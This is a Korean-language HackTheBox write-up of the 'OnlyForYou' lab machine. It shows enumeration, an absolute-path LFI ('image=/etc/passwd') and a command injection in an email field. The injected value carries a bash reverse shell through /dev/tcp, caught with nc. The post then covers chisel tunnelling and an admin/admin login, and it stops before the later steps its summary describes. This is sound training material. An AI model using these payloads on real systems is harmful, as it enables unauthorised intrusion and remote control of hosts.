---
title: "OnlyForYou (Medium)"
date: 2025-10-25
layout: single
excerpt: "OnlyForYou는 중간 난이도 머신으로, 웹 애플리케이션에 존재하는 LFI(Local File Inclusion) 취약점을 통해 소스 코드를 열람할 수 있고, 이 코드에서 발견된 Blind Command Injection을 이용해 셸을 획득할 수 있다. 이후 머신 내부에서 실행 중인 여러 로컬 서비스 중 하나가 기본 자격 증명을 사용하고 있으며, 이 서비스의 특정 엔드포인트는 Cypher 인젝션에 취약하여 Neo4j 데이터베이스의 해시를 유출할 수 있고, 이 해시를 통해 SSH 접근 권한을 얻는다. 마지막으로, sudoers 파일이 잘못 구성되어 있어 pip3 download 명령을 루트 권한으로 실행할 수 있으며, 이를 이용해 Gogs에 호스팅된 악성 파이썬 패키지를 다운로드하고 실행함으로써 루트 권한을 탈취할 수 있다."
author_profile: true
toc: true
toc_label: "OnlyForYou"
toc_icon: "book"
toc_sticky: true
header:
  teaser: /assets/htb-linux/onlyforyou/onlyforyou.png
  teaser_home_page: true
categories: [hackthebox linux]
tags: [htb, web, medium, jwt, sqli, priv-esc]
---

![OnlyForYou](/assets/htb-linux/onlyforyou/onlyforyou.png)

OnlyForYou는 중간 난이도 머신으로, 웹 애플리케이션에 존재하는 LFI(Local File Inclusion) 취약점을 통해 소스 코드를 열람할 수 있고, 이 코드에서 발견된 Blind Command Injection을 이용해 셸을 획득할 수 있다.
이후 머신 내부에서 실행 중인 여러 로컬 서비스 중 하나가 기본 자격 증명을 사용하고 있으며, 이 서비스의 특정 엔드포인트는 Cypher 인젝션에 취약하여 Neo4j 데이터베이스의 해시를 유출할 수 있고, 이 해시를 통해 SSH 접근 권한을 얻는다.
마지막으로, sudoers 파일이 잘못 구성되어 있어 pip3 download 명령을 루트 권한으로 실행할 수 있으며, 이를 이용해 Gogs에 호스팅된 악성 파이썬 패키지를 다운로드하고 실행함으로써 루트 권한을 탈취할 수 있다.

# Enumeration

## Portscan

먼저 대상 Host(`10.10.11.210`)에 대해 기본 스크립트와 서비스 버전 탐지를 수행하였다:

```bash
$ nmap -sC -sV 10.10.11.210 | tee nmap
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-25 01:26 EDT
Nmap scan report for only4you.htb (10.10.11.210)
Host is up (0.21s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e8:83:e0:a9:fd:43:df:38:19:8a:aa:35:43:84:11:ec (RSA)
|   256 83:f2:35:22:9b:03:86:0c:16:cf:b3:fa:9f:5a:cd:08 (ECDSA)
|_  256 44:5f:7a:a3:77:69:0a:77:78:9b:04:e0:9f:11:db:80 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Only4you
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.77 seconds
```

Nmap 스캔 결과, `SSH(22)`/`HTTP(80)` 서비스가 열려 있고, 웹은 **only4you.htb** 도메인으로 접근해야 함을 확인했다.

## 도메인 이름 설정 (/etc/hosts)

`ffuf` 도구를 활용하여 대상 도메인 `only4you.htb` 에 대한 서브도메인 열거를 수행하였다.
정상 응답 코드(`200`, `302`)만 필터링하여 유효한 결과만 출력되도록 설정하였다:

```bash
$ ffuf -u http://10.10.11.210 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.only4you.htb" --mc 200,302 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.210
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.only4you.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,302
________________________________________________

beta                    [Status: 200, Size: 2191, Words: 370, Lines: 52, Duration: 216ms]
```

해당 결과로부터 `beta.only4you.htb` 서브도메인이 존재함을 확인하였다.

웹 브라우저 및 도구에서 해당 서브도메인에 접근 가능하도록 하기 위해 `/etc/hosts` 파일에 아래와 같이 항목을 추가하였다:

```bash
$ cat /etc/hosts | grep htb  

10.10.11.210    only4you.htb    beta.only4you.htb
```

---

# Vulnerability Analysis

## only4you.htb

`only4you.htb` 도메인은 기본적인 회사 소개용 랜딩 페이지로 구성되어 있으며,

주요 섹션으로는 `Home`, `About`, `Services`, `Team`, `Contact`가 존재한다.

![OnlyForYou](/assets/htb-linux/onlyforyou/only4you.png)

특별한 기능이나 로그인 페이지는 존재하지 않으며, 하단에는 다음과 같은 **이메일/연락처 입력 폼(Contact Form)**이 포함되어 있다:

![OnlyForYou](/assets/htb-linux/onlyforyou/email-form.png)

## beta.only4you.htb

해당 도메인은 Only4you의 베타 기능 안내용 페이지로, 단순한 메시지와 함께 두 개의 버튼(`Return back`, `Source Code`)이 제공된다:

![OnlyForYou](/assets/htb-linux/onlyforyou/beta-only4you.png)

`Source Code` 버튼을 통해 소스코드 다운로드 기능을 제공하며, 상단 메뉴에는 `/resize`, `/convert` 경로로 연결되는 링크가 존재한다.

### Directory Listing

해당 도메인에 대해 디렉토리 및 파일 구조를 확인하기 위해 `gobuster` 를 활용한 디렉토리 브루트포싱을 수행하였다:

```bash
$ gobuster dir -u http://beta.only4you.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                    

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://beta.only4you.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/download             (Status: 405) [Size: 683]
/list                 (Status: 200) [Size: 5934]
/source               (Status: 200) [Size: 12127]
/convert              (Status: 200) [Size: 2760]
/resize               (Status: 200) [Size: 2984]
```

브루트포싱 결과, 웹 인터페이스 상에서는 노출되지 않았던 `/list`, `/download` 경로의 존재를 확인하였다.

### Source Code

소스코드를 다운로드하여 `app.py` 를 분석한 결과, 파일 다운로드 처리 로직(`/download`)에서 **LFI 취약점이 존재**함을 확인하였다.

<details style="border: 1px solid #ccc; padding: 0.5em; border-radius: 5px;">  
    <summary style="font-weight: bold; cursor: pointer;">app.py 코드는 다음과 같다:</summary>
    <br>
    <div markdown="1">

```python
from flask import Flask, request, send_file, render_template, flash, redirect, send_from_directory
import os, uuid, posixpath
from werkzeug.utils import secure_filename
from pathlib import Path
from tool import convertjp, convertpj, resizeimg

app = Flask(__name__)
app.secret_key = uuid.uuid4().hex
app.config['MAX_CONTENT_LENGTH'] = 1024 * 1024
app.config['RESIZE_FOLDER'] = 'uploads/resize'
app.config['CONVERT_FOLDER'] = 'uploads/convert'
app.config['LIST_FOLDER'] = 'uploads/list'
app.config['UPLOAD_EXTENSIONS'] = ['.jpg', '.png']

@app.route('/', methods=['GET'])
def main():
    return render_template('index.html')

@app.route('/resize', methods=['POST', 'GET'])
def resize():
    if request.method == 'POST':
        if 'file' not in request.files:
            flash('Something went wrong, Try again!', 'danger')
            return redirect(request.url)
        file = request.files['file']
        img = secure_filename(file.filename)
        if img != '':
            ext = os.path.splitext(img)[1]
            if ext not in app.config['UPLOAD_EXTENSIONS']:
                flash('Only png and jpg images are allowed!', 'danger')
                return redirect(request.url)    
            file.save(os.path.join(app.config['RESIZE_FOLDER'], img))
            status = resizeimg(img)
            if status == False:
                flash('Image is too small! Minimum size needs to be 700x700', 'danger')
                return redirect(request.url)
            else:
                flash('Image is succesfully uploaded!', 'success')
        else:
            flash('No image selected!', 'danger')
            return redirect(request.url)
        return render_template('resize.html', clicked="True"), {"Refresh": "5; url=/list"}
    else:
        return render_template('resize.html', clicked="False")

@app.route('/convert', methods=['POST', 'GET'])
def convert():
    if request.method == 'POST':
        if 'file' not in request.files:
            flash('Something went wrong, Try again!', 'danger')
            return redirect(request.url)
        file = request.files['file']
        img = secure_filename(file.filename)
        if img != '':
            ext = os.path.splitext(img)[1]
            if ext not in app.config['UPLOAD_EXTENSIONS']:
                flash('Only jpg and png images are allowed!', 'danger')
                return redirect(request.url)    
            file.save(os.path.join(app.config['CONVERT_FOLDER'], img))
            if ext == '.png':
                image = convertpj(img)
                return send_from_directory(app.config['CONVERT_FOLDER'], image, as_attachment=True)
            else:
                image = convertjp(img)
                return send_from_directory(app.config['CONVERT_FOLDER'], image, as_attachment=True)
        else:
            flash('No image selected!', 'danger')
            return redirect(request.url) 
        return render_template('convert.html')
    else:
        [f.unlink() for f in Path(app.config['CONVERT_FOLDER']).glob("*") if f.is_file()]
        return render_template('convert.html')

@app.route('/source')
def send_report():
    return send_from_directory('static', 'source.zip', as_attachment=True)

@app.route('/list', methods=['GET'])
def list():
    return render_template('list.html')

@app.route('/download', methods=['POST'])
def download():
    image = request.form['image']
    filename = posixpath.normpath(image) 
    if '..' in filename or filename.startswith('../'):
        flash('Hacking detected!', 'danger')
        return redirect('/list')
    if not os.path.isabs(filename):
        filename = os.path.join(app.config['LIST_FOLDER'], filename)
    try:
        if not os.path.isfile(filename):
            flash('Image doesn\'t exist!', 'danger')
            return redirect('/list')
    except (TypeError, ValueError):
        raise BadRequest()
    return send_file(filename, as_attachment=True)

@app.errorhandler(404)
def page_not_found(error):
    return render_template('404.html'), 404

@app.errorhandler(500)
def server_error(error):
    return render_template('500.html'), 500

@app.errorhandler(400)
def bad_request(error):
    return render_template('400.html'), 400

@app.errorhandler(405)
def method_not_allowed(error):
    return render_template('405.html'), 405

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=80, debug=False)
```

</div>
</details>
<br>

코드에서 확인할 수 있듯이, `..` 문자열과 `../` 패턴만을 필터링하고 있으며, 그 외의 경로 조작에 대해서는 별도의 검증이 이루어지지 않는다.

특히 다음 부분이 핵심적인 문제이다:

```python
if not os.path.isabs(filename):
    filename = os.path.join(app.config['LIST_FOLDER'], filename)
```

이 조건문으로 인해 절대 경로(`/etc/passwd`) 입력 시 해당 검증 로직이 적용되지 않고, `filename` 이 그대로 `send_file()` 함수에 전달된다.

예를 들어, 아래와 같은 요청을 통해 시스템 파일을 직접 노출시킬 수 있다:

```ini
image=/etc/passwd
```

위 로직을 통해, 절대 경로 입력은 필터링 로직을 우회할 수 있으며, 이는 명확한 **LFI 취약점**으로 판단된다.

### LFI

소스코드를 통해 `/download` 라우트는 POST 방식으로 `image` 파라미터를 수신하여, 서버의 파일을 반환하는 구조임을 확인하였다.

따라서 Burp Suite를 이용해 `Content-Type: application/x-www-form-urlencoded` 헤더와 함께 `image=/etc/passwd` 값을 포함한 POST 요청을 전송하면, `/etc/passwd` 파일이 그대로 반환된다.

![OnlyForYou](/assets/htb-linux/onlyforyou/lfi.png)

이후 `/etc/nginx/sites-enabled/default` 파일을 확인한 결과, 다음과 같은 웹 루트 디렉토리 경로들을 확인할 수 있었다:

```nginx
server {
    listen 80;
    return 301 http://only4you.htb$request_uri;
}

server {
	listen 80;
	server_name only4you.htb;

	location / {
                include proxy_params;
                proxy_pass http://unix:/var/www/only4you.htb/only4you.sock;
	}
}

server {
	listen 80;
	server_name beta.only4you.htb;

        location / {
                include proxy_params;
                proxy_pass http://unix:/var/www/beta.only4you.htb/beta.sock;
        }
}
```

해당 설정을 통해 두 개의 주요 경로가 존재함을 알 수 있다.

- `only4you.htb → /var/www/only4you.htb/`
- `beta.only4you.htb → /var/www/beta.only4you.htb/`

### Source Leak

이전 단계에서 `/etc/nginx/sites-enabled/default` 파일을 확인해 웹 루트 경로가 `/var/www/only4you.htb` 임을 확인하였고, 해당 디렉토리의 `app.py` 파일을 분석하였다:

```python
from flask import Flask, render_template, request, flash, redirect
from form import sendmessage
import uuid

app = Flask(__name__)
app.secret_key = uuid.uuid4().hex

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        email = request.form['email']
        subject = request.form['subject']
        message = request.form['message']
        ip = request.remote_addr

        status = sendmessage(email, subject, message, ip)
        if status == 0:
            flash('Something went wrong!', 'danger')
        elif status == 1:
            flash('You are not authorized!', 'danger')
        else:
            flash('Your message was successfuly sent! We will reply as soon as possible.', 'success')
        return redirect('/#contact')
    else:
        return render_template('index.html')

# ... SKIP ...
```

위 소스코드는 메인 페이지에서 이메일, 제목, 메시지 를 받아, `sendmessage()` 함수를 통해 메일을 전송하는 구조이다.

해당 함수는 파일 상단에서 `form` 이라는 이름의 모듈에서 `import` 된다.

이후 `/var/www/only4you.htb/form.py` 경로로 이동한 후 소스코드를 분석하였다.

<details style="border: 1px solid #ccc; padding: 0.5em; border-radius: 5px;">  
    <summary style="font-weight: bold; cursor: pointer;">form.py 코드는 다음과 같다:</summary>
    <br>
    <div markdown="1">

```python
import smtplib, re
from email.message import EmailMessage
from subprocess import PIPE, run
import ipaddress

def issecure(email, ip):
	if not re.match("([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})", email):
		return 0
	else:
		domain = email.split("@", 1)[1]
		result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
		output = result.stdout.decode('utf-8')
		if "v=spf1" not in output:
			return 1
		else:
			domains = []
			ips = []
			if "include:" in output:
				dms = ''.join(re.findall(r"include:.*\.[A-Z|a-z]{2,}", output)).split("include:")
				dms.pop(0)
				for domain in dms:
					domains.append(domain)
				while True:
					for domain in domains:
						result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
						output = result.stdout.decode('utf-8')
						if "include:" in output:
							dms = ''.join(re.findall(r"include:.*\.[A-Z|a-z]{2,}", output)).split("include:")
							domains.clear()
							for domain in dms:
								domains.append(domain)
						elif "ip4:" in output:
							ipaddresses = ''.join(re.findall(r"ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]{2}", output)).split("ip4:")
							ipaddresses.pop(0)
							for i in ipaddresses:
								ips.append(i)
						else:
							pass
					break
			elif "ip4" in output:
				ipaddresses = ''.join(re.findall(r"ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]{2}", output)).split("ip4:")
				ipaddresses.pop(0)
				for i in ipaddresses:
					ips.append(i)
			else:
				return 1
		for i in ips:
			if ip == i:
				return 2
			elif ipaddress.ip_address(ip) in ipaddress.ip_network(i):
				return 2
			else:
				return 1

def sendmessage(email, subject, message, ip):
	status = issecure(email, ip)
	if status == 2:
		msg = EmailMessage()
		msg['From'] = f'{email}'
		msg['To'] = 'info@only4you.htb'
		msg['Subject'] = f'{subject}'
		msg['Message'] = f'{message}'

		smtp = smtplib.SMTP(host='localhost', port=25)
		smtp.send_message(msg)
		smtp.quit()
		return status
	elif status == 1:
		return status
	else:
		return status
```

</div>
</details>
<br>


`form.py` 소스를 살펴본 결과 취약한 코드가 담겨져 있다:

```python
def issecure(email, ip):
	if not re.match("([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})", email):
		return 0
	else:
		domain = email.split("@", 1)[1]
		result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
		output = result.stdout.decode('utf-8')
		if "v=spf1" not in output:
			return 1
# ... SKIP ...
```

이메일이 정규식 패턴을 만족할 경우, `else` 구문으로 진입하여 도메인 부분에 대해 `dig` 명령어를 실행하는 구조이다.

`python3` 환경에서 정규식을 테스트하기 위해 간단한 `issecure()` 함수를 정의하여 이메일 형식을 검증하였다:

![OnlyForYou](/assets/htb-linux/onlyforyou/python.png)

`; sleep 3` 과 같은 명령어가 포함된 이메일 주소도 정규표현식을 통과하여 **The email is correct!** 라고 출력된다. 이는 곧 **Command Injection** 의 가능성을 나타낸다:

![OnlyForYou](/assets/htb-linux/onlyforyou/issecure.png)

---

# Exploitation

## only4you.htb - Command Injection (RCE)

처음 열거했던 `only4you.htb` 도메인의 이메일 입력란에 리버스 셸을 삽입하였다:

```bash
jisang@only4you.htb; bash -c 'bash -i >& /dev/tcp/10.10.14.20/9001 0>&1'
```

![OnlyForYou](/assets/htb-linux/onlyforyou/revshell.png)

HTML `email` 입력 필드에는 기본적으로 이메일 형식을 제한하는 `type="email"` 속성이 존재하므로, 개발자 도구(F12)를 사용하여 해당 속성을 제거하였다:

![OnlyForYou](/assets/htb-linux/onlyforyou/type-none.png)

이후 나의 터미널에서 `nc` 명령어를 사용하여 포트를 열어 대기하였다:

```bash
$ nc -lvnp 9001
```

그리고 웹 페이지에서 **Send Message** 버튼을 클릭하면, 삽입된 명령어가 실행되어 리버스 셸이 연결되며 `www-data` 셸 획득에 성공하였다.

![OnlyForYou](/assets/htb-linux/onlyforyou/webshell.png)

---

# Privilege Escalation

## www-data → john Lateral Movement

`www-data` 셸을 획득한 뒤, 아래 명령어를 통해 인터랙티브 셸로 업그레이드하였다:

```bash
www-data@only4you:~/only4you.htb$ python3 -c "import pty;pty.spawn('/bin/bash')"
```

### Internal Network Enumeration

`netstat` 명령어를 사용하여 현재 열려 있는 로컬 포트 및 서비스를 확인하였다:

```bash
www-data@only4you:~/only4you.htb$ netstat -tul 

Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 localhost:33060         0.0.0.0:*               LISTEN     
tcp        0      0 localhost:mysql         0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:http            0.0.0.0:*               LISTEN     
tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN     
tcp        0      0 localhost:3000          0.0.0.0:*               LISTEN     
tcp        0      0 localhost:8001          0.0.0.0:*               LISTEN     
tcp6       0      0 127.0.0.1:7687          [::]:*                  LISTEN     
tcp6       0      0 127.0.0.1:7474          [::]:*                  LISTEN     
tcp6       0      0 [::]:ssh                [::]:*                  LISTEN     
udp        0      0 localhost:domain        0.0.0.0:*                          
udp        0      0 0.0.0.0:bootpc          0.0.0.0:*    
```

의심스러운 포트인 `3000`, `8001`, `7687`, `7474` 등이 localhost 바인딩으로 열려 있는 것을 확인하였다. 

이는 외부에서는 접근할 수 없지만, 내부에서 실행 중인 웹 애플리케이션일 가능성이 크다.

### Port Forwarding

위 정보를 바탕으로 [chisel](https://github.com/jpillora/chisel) 도구를 이용하여 포트 포워딩을 수행하였다.

먼저, 내 터미널에서 **Server 모드**의 `chisel`을 실행하였다:

```bash
$ ./chisel server -p 8000 --reverse
```

그 후, 웹 셸이 연결된 대상 서버에서 **Client 모드**로 내부 포트를 바깥으로 포워딩하였다:

```bash
www-data@only4you:~/only4you.htb$ ./chisel client 10.10.14.20:8000 R:3000:127.0.0.1:3000 R:8001:127.0.0.1:8001 R:7474:127.0.0.1:7474
```

이후 공격자 측 `chisel` 서버 터미널에서 아래와 같이 포트가 정상적으로 포워딩되고 있음을 확인할 수 있다:

```bash
2025/10/26 15:53:15 server: Reverse tunnelling enabled
2025/10/26 15:53:15 server: Fingerprint Drswy/YRWz4T9JsG/ziXlFKq02cOs3cIs8yRj5BxSbo=
2025/10/26 15:53:15 server: Listening on http://0.0.0.0:8000
2025/10/26 15:55:19 server: session#1: tun: proxy#R:3000=>3000: Listening
2025/10/26 15:55:19 server: session#1: tun: proxy#R:8001=>8001: Listening
2025/10/26 15:55:19 server: session#1: tun: proxy#R:7474=>7474: Listening
```

### Exploring Forwarded Web Applications

먼저 `3000` 포트에 서비스되고 있는 웹 애플리케이션에 접근하였다:

![OnlyForYou](/assets/htb-linux/onlyforyou/gogs.png)

해당 웹사이트는 **Gogs**라는 Git 저장소 관리 도구로, 내부에서 운영되는 Git 서비스인 것으로 보인다.

사용자 목록을 확인한 결과, `administrator` 계정과 `john` 이라는 일반 사용자가 등록되어 있는 것을 확인할 수 있었다:

![OnlyForYou](/assets/htb-linux/onlyforyou/gogs-user.png)

`7474` 포트에 접근하자 Neo4j 웹 인터페이스가 나타났다. 이는 웹 기반의 `Neo4j Browser`로, 그래프 데이터베이스와 상호작용할 수 있는 콘솔을 제공한다:

![OnlyForYou](/assets/htb-linux/onlyforyou/neo4j.png)

`8001` 포트에서는 내부용 로그인 페이지가 나타났다:

![OnlyForYou](/assets/htb-linux/onlyforyou/onlyforyou-localhost.png)

로그인 페이지에서 `admin/admin` 을 사용한 결과, 로그인에 성공하였고 `/dashboard` 경로로 리다이렉트되었다:

![OnlyForYou](/assets/htb-linux/onlyforyou/onlyforyou-dashboard.png)